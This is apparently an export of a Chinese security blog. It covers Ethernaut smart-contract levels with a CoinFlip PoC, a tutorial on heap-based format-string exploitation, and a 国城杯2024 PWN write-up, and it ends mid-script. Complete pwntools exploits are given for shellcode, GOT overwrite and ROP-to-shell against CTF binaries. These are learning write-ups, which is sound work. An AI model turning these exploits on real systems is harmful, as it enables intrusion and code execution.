<p><img src="/images/pasted-21.png" alt="upload successful"></p>
<h2 id="创建钱包">创建钱包</h2>
<p>按照提示一步一步来即可获得一个钱包</p>
<h3 id="助记词">助记词</h3>
<p>在钱包创建完成前，MetaMask会提示你是否启用安全选项（即助记词）</p>
<blockquote>
<p>助记词是一组由随机生成的单词组成的短语，用于备份和恢复加密货币钱包的私钥</p>
</blockquote>
<p>助记词可通过BIP39工具生成</p>
<blockquote>
<p>BIP39（Bitcoin Improvement Proposal 39）是一种标准，它定义了一种生成和恢复加密货币钱包的方法，通过使用一组易于记忆的单词序列，即助记词。这些助记词可以生成种子，进而派生出加密货币钱包的私钥和地址。BIP39的主要作用是简化用户备份和恢复钱包的过程，同时提高安全性，因为它允许用户通过记住或写下这些单词来备份他们的钱包，而不是复杂的私钥字符串。</p>
</blockquote>
<p>BIP39工具安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install hdwallet</span><br></pre></td></tr></table></figure>
<h3 id="创建完成">创建完成</h3>
<p>创建完成后即可在Etherscan上查看账户信息</p>
<p><img src="/images/pasted-22.png" alt="upload successful"></p>
<h1>0x02 智能合约——Solidity语言</h1>
<p>Solidity 是一种专门用于编写智能合约的高级编程语言，主要用于以太坊及兼容以太坊虚拟机（EVM）的区块链平台，其作用是通过代码定义去中心化应用（DApp）的自动化规则和逻辑（如代币发行、交易协议等），并确保这些合约在区块链上安全、透明地执行。</p>
<h2 id="第一个合约">第一个合约</h2>
<p>在线IDE——<a href="https://remix.ethereum.org/"><strong>Remix</strong></a></p>
<p>合约，使用Solidity语言编写：</p>
<p><img src="/images/pasted-23.png" alt="upload successful"></p>
<p>版本选择与编译：</p>
<p><img src="/images/pasted-24.png" alt="upload successful"></p>
<p>连接metamask:</p>
<p><img src="/images/pasted-25.png" alt="upload successful"></p>
<p><img src="/images/pasted-26.png" alt="upload successful"></p>
<p>部署合约：</p>
<p><img src="/images/pasted-27.png" alt="upload successful"></p>
<p>（但是付不起…）</p>
<h1>0x03 浅尝区块链安全</h1>
<p>Ethernaut靶场：<a href="https://ethernaut.openzeppelin.com/">https://ethernaut.openzeppelin.com/</a></p>
<h2 id="第二关-Fallback">第二关 Fallback</h2>
<p>合约代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line">    mapping(address =&gt; uint256) public contributions;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function contribute() public payable &#123;</span><br><span class="line">        require(msg.value &lt; 0.001 ether);</span><br><span class="line">        contributions[msg.sender] += msg.value;</span><br><span class="line">        if (contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">            owner = msg.sender;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getContribution() public view returns (uint256) &#123;</span><br><span class="line">        return contributions[msg.sender];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public onlyOwner &#123;</span><br><span class="line">        payable(owner).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的取钱函数加上了<code>onlyOwner</code>修饰，即必须是合约所有者才能取钱</p>
<p>但是在<code>receive()</code>函数中，当<code>msg.value</code>和<code>contributions[msg.sender]</code>大于0我们就可以变成合约的所有者了</p>
<h3 id="PoC">PoC</h3>
<p>先contribute1GWei，然后再向合约转一点ETH即可变成owner</p>
<h2 id="第三关-Fallout">第三关 Fallout</h2>
<p>合约代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    mapping(address =&gt; uint256) allocations;</span><br><span class="line">    address payable public owner;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        allocations[owner] = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocations() public onlyOwner &#123;</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>构造函数命名错误</p>
<h3 id="Poc">Poc</h3>
<p>发送一点ETH即可变成owner</p>
<h2 id="第四关-Coin-Flip">第四关 Coin Flip</h2>
<p>合约代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins;</span><br><span class="line">    uint256 lastHash;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            revert();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue;</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其<code>coinFlip</code>是通过<code>blockValue / FACTOR</code>进行计算的</p>
<p>即</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">coinFlip = uint256(blockhash(block.number - 1)) / FACTOR</span><br></pre></td></tr></table></figure>
<p><code>block.number</code>和<code>FACTOR</code>均为已知值</p>
<h3 id="PoC-2">PoC</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PoC&#123;</span><br><span class="line">    CoinFlip public target;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _target)&#123;</span><br><span class="line">        target = CoinFlip(_target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _guess() public&#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line">        target.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>区块链安全</tag>
      </tags>
  </entry>
  <entry>
    <title>非栈上格式化字符串利用Part1</title>
    <url>/2025/05/24/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2Part1/</url>
    <content><![CDATA[<h1>0x1 概述</h1>
<p>非栈上格式化字符串漏洞特指在<code>printf(char *fmt, ...)</code>函数调用中，格式字符串参数<code>fmt</code>的存储位置不在当前函数栈帧中的情况。其常见表现形式主要包括以下两种类型：</p>
<ul class="lvl-0">
<li class="lvl-2">全局变量传入：当格式字符串通过存储在全局数据区（<code>.bss</code>段）的全局变量进行传递时</li>
<li class="lvl-2">堆指针传入：当格式字符串指针指向通过<code>malloc</code>等函数动态分配的堆内存区域时</li>
</ul>
<p>非栈上格式化字符串和栈上格式化字符串漏洞利用最大的区别就是<strong>非栈上格式化字符串漏洞无法通过操控或者布局栈上的变量来实现任意地址写等操作</strong>。对于Part1，我们先来介绍一个比较简单的例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="comment">// gcc -fstack-protector-all -no-pie -z now -o main main.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inits</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter \&quot;quit\&quot; to stop program!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulations! backdoor found!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(buf,<span class="string">&quot;quit&quot;</span>, <span class="number">4</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(buf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    inits();</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译后checksec<br>
<img src="https://www.mmmick.cn/images/pasted-30.png" alt="upload successful"><br>
除了PIE，其余保护全开如果这题是在栈上的话，那思路很明确：泄露栈地址-&gt;将$bp+8填到栈上-&gt;修改返回地址为backdoor即可。但是对于本题就不一样了，我们所输入的内容都被放到了堆中，无法控制栈布局来任意修改地址。这时候就要引入ex师傅所提出的<a href="https://blog.eonew.cn/2019/08/27/printf-%E6%88%90%E9%93%BE%E6%94%BB%E5%87%BB/">printf 成链攻击</a>，成链攻击主要是利用栈上的数据链来进行攻击。</p>
<h1>0x2 利用</h1>
<p>我们接下来要利用的链<strong>形如</strong>下图<img src="https://www.mmmick.cn/images/pasted-31.png" alt="upload successful"><br>
众所周知，对于格式化字符串，如果我们修改某个地址上的值，所使用的占位符为<code>%n</code>，而<code>%n</code>所修改的参数为一个地址，这也就是为什么需要一条二级以上的数据链进行攻击的原因了。对于非栈上格式化字符串，我们既然无法控制栈布局，为何不尝试下直接控制栈上已有变量，将栈变成我们想要的样子呢？对于此，我们可以先将三级链的<strong>第二级</strong>栈地址和当前函数调用栈的<strong>返回地址</strong>给泄露出来<img src="https://www.mmmick.cn/images/pasted-32.png" alt="upload successful"><br>
观察发现，三级链的最后一级的地址和<code>$bp+8</code>仅有低三位不同，因此我们可以把<code>0x7fff1a1487a8 —▸ 0x7fff1a148898 —▸ 0x7fff1a148bc2 ◂— 0x53006e69616d2f2e /* './main' */</code><br>
修改为<code>0x7fff1a1487a8 —▸ 0x7fff1a148898 —▸ 0x7fff1a148768 —▸ 0x4013e2 (main+47) ◂— mov eax, 0</code><br>
<img src="https://www.mmmick.cn/images/pasted-33.png" alt="upload successful"><br>
这样其实就间接实现了上面所述的<strong>将$bp+8填到栈上</strong>这一步骤到这里的exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chain_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = chain_addr - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">f&quot;chain address: <span class="subst">&#123;<span class="built_in">hex</span>(chain_addr)&#125;</span>, ret address: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%19$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>接下来其实就简单了，既然栈上已经有一条二级链指向返回地址，我们只需要再用一次<code>%n</code>修改返回地址为backdoor就行了<img src="https://www.mmmick.cn/images/pasted-34.png" alt="图片描述"><br>
到这里的exp为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">backdoor = <span class="number">0x4012b8</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%49$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br></pre></td></tr></table></figure>
<p>最后输入<code>quit</code>即可getshell<br>
<img src="https://www.mmmick.cn/images/pasted-36.png" alt="图片描述"></p>
<h1>0x3 EXP</h1>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter &quot;quit&quot; to stop program!\n&#x27;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;%19$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">chain_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">ret_addr = chain_addr - <span class="number">0x130</span></span><br><span class="line">log.success(<span class="string">f&quot;chain address: <span class="subst">&#123;<span class="built_in">hex</span>(chain_addr)&#125;</span>, ret address: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%19$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4012b8</span></span><br><span class="line">payload = <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(backdoor &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&quot;%49$hn&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;quit&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>0x4 参考文章</h1>
<p>Ex师傅的printf 成链攻击: <a href="https://blog.eonew.cn/2019/08/27/printf-%E6%88%90%E9%93%BE%E6%94%BB%E5%87%BB/">https://blog.eonew.cn/2019/08/27/printf-成链攻击/</a></p>
]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>国城杯2024 PWN WP</title>
    <url>/2024/12/08/%E5%9B%BD%E5%9F%8E%E6%9D%AF2024-WP/</url>
    <content><![CDATA[<h1>国城杯2024 PWN WP</h1>
<h2 id="alphashell">alphashell</h2>
<p><img src="/images/pasted-14.png" alt="upload successful"></p>
<h3 id="分析">分析</h3>
<p>要求输入字符为可见字符</p>
<p>sandbox禁用了open write writev read和execve等函数</p>
<h3 id="EXP">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./attachment&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;125.70.243.22&#x27;,&#x27;31709&#x27;)</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">mov rbx,0x67616c662f</span></span><br><span class="line"><span class="string">push rbx</span></span><br><span class="line"><span class="string">mov rdx,0</span></span><br><span class="line"><span class="string">xor r10,r10</span></span><br><span class="line"><span class="string">mov rdi,r10</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov eax,SYS_openat</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi,rax</span></span><br><span class="line"><span class="string">mov r10,0x100</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov eax,SYS_sendfile</span></span><br><span class="line"><span class="string">syscall </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">obj = AE64()</span><br><span class="line">payload = obj.encode(sc,<span class="string">&#x27;rdx&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="beverage-store">beverage store</h2>
<h3 id="分析-2">分析</h3>
<p>类型转换错误，导致可以反向越界修改之前的内容</p>
<p>对于这道题，可以先修改exit got，重启程序流程</p>
<p>接着修改printf got为system，最后把exit got重新改为后门函数地址即可</p>
<h3 id="EXP-2">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31668&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">clibc = cdll.LoadLibrary(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">clibc.srand(<span class="number">0x42424242</span>)</span><br><span class="line">num = clibc.rand()</span><br><span class="line">ru(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0x40133B</span>) + p64(<span class="number">0x401511</span>)</span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;-6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sd(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">libc_base = addr64() - <span class="number">0x46061</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sl(<span class="string">b&#x27;-7&#x27;</span>)</span><br><span class="line">payload = p64(system)</span><br><span class="line">sd(payload)</span><br><span class="line">sl(<span class="string">b&#x27;-4&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0x401511</span>)</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Offensive-Security">Offensive_Security</h2>
<h3 id="分析-3">分析</h3>
<p><img src="/images/pasted-15.png" alt="upload successful"></p>
<p><img src="/images/pasted-16.png" alt="upload successful"></p>
<p><img src="/images/pasted-17.png" alt="upload successful"></p>
<p>多线程但是未对资源加锁，输入任意同样的字符串即可绕过限制</p>
<p><img src="/images/pasted-18.png" alt="upload successful"></p>
<p>存在格式化字符串漏洞，可泄露密码和libc基址</p>
<p>最后栈溢出然后getshell</p>
<h3 id="EXP-3">EXP</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#----------------function area start----------------#</span></span><br><span class="line">sla = <span class="keyword">lambda</span> ch,data:p.sendlineafter(ch,data)</span><br><span class="line">sda = <span class="keyword">lambda</span> ch,data:p.sendafter(ch,data)</span><br><span class="line">sd = <span class="keyword">lambda</span> data:p.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data:p.sendline(data)</span><br><span class="line">addr32 = <span class="keyword">lambda</span>:u32(p.recvuntil(<span class="string">b&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line">addr64 = <span class="keyword">lambda</span>:u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr_name,addr:log.success(<span class="string">&quot;&#123;&#125; --&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr_name,<span class="built_in">hex</span>(addr)))</span><br><span class="line">ru = <span class="keyword">lambda</span> con:p.recvuntil(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">bp=<span class="number">0</span></span>):</span><br><span class="line">    gdb.attach(p,bp)</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#----------------function area end------------------#</span></span><br><span class="line"><span class="comment"># p = process(&quot;./attachment&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./attachment&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;125.70.243.22&#x27;</span>,<span class="string">&#x27;31652&#x27;</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sla(<span class="string">&#x27;Username:&#x27;</span>,<span class="string">&#x27;%7$s%39$p&#x27;</span>)</span><br><span class="line">        ru(<span class="string">&#x27;Welcome, \n&#x27;</span>)</span><br><span class="line">        passwd = p.recv(<span class="number">8</span>)</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        sl(passwd)</span><br><span class="line">        libc_leak = addr64()</span><br><span class="line">        lg(<span class="string">&#x27;libc_leak&#x27;</span>,libc_leak)</span><br><span class="line">        <span class="keyword">if</span> (libc_leak &amp; <span class="number">0xff</span>) == <span class="number">0x80</span>:</span><br><span class="line">            libc_base = libc_leak - <span class="number">0x21b780</span></span><br><span class="line">            lg(<span class="string">&#x27;libc base&#x27;</span>,libc_base)</span><br><span class="line">            sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            ogs = [<span class="number">0xebc81</span>,<span class="number">0xebc85</span>,<span class="number">0xebc88</span>]</span><br><span class="line">            payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x28</span> + p64(<span class="number">0x0000000000400462</span>) + p64(<span class="number">0x0000000000400661</span>) + p64(libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc_base+libc.sym.system)</span><br><span class="line">            sla(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span 